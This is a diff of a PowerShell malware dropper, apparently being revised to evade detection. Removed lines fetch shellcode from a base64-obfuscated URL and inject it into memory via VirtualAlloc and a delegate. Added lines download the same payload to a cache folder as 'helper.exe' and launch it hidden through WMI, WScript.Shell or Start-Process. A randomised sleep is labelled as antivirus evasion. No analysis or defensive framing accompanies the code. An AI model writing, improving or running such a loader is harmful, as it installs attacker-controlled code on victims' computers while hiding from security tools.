@@ -78,36 +78,23 @@ if (-not $isFirstRun) {
 # === BEARFOOS EVASION: Delay before payload ===
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-# === FILELESS SHELLCODE EXECUTION (DELEGATE) ===
-$shellcodeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl'))
+# === DOWNLOAD AND EXECUTE PAYLOAD (DISK-BASED) ===
+$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl'))
+$exePath = "$cache\helper.exe"
 
-try {
-    # Download shellcode
-    $sc = (New-Object Net.WebClient).DownloadData($shellcodeUrl)
-    
-    # Allocate memory in current process
-    $k32 = Add-Type -MemberDefinition @"
-[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-[DllImport("kernel32")] public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
-[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-[DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-"@ -Name 'K32' -Namespace 'Win32' -PassThru
-    
-    $addr = $k32::VirtualAlloc(0, [uint32]$sc.Length, 0x3000, 0x40)
-    if ($addr -eq 0) { throw "VirtualAlloc failed" }
-    
-    # Copy shellcode
-    [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
-    
-    # Execute via delegate (works on x86/x64)
-    $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Type]([Action]))
-    $delegate.Invoke()
-    
-} catch {
-    # Fallback to disk only if everything fails
-    $fallbackPath = "$cache\helper.exe"
-    [System.IO.File]::WriteAllBytes($fallbackPath, $sc)
-    Start-Process $fallbackPath -WindowStyle Hidden
+if (-not (Test-Path $exePath)) {
+    $retryCount = 0; $maxRetries = 3
+    do {
+        try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing; break } catch { $retryCount++; Start-Sleep -Seconds 5 }
+    } while ($retryCount -lt $maxRetries)
+}
+
+if (Test-Path $exePath) {
+    try {
+        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
+    } catch {
+        try { (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) } catch { Start-Process $exePath -WindowStyle Hidden }
+    }
 }
 
 # === CLEANUP ===
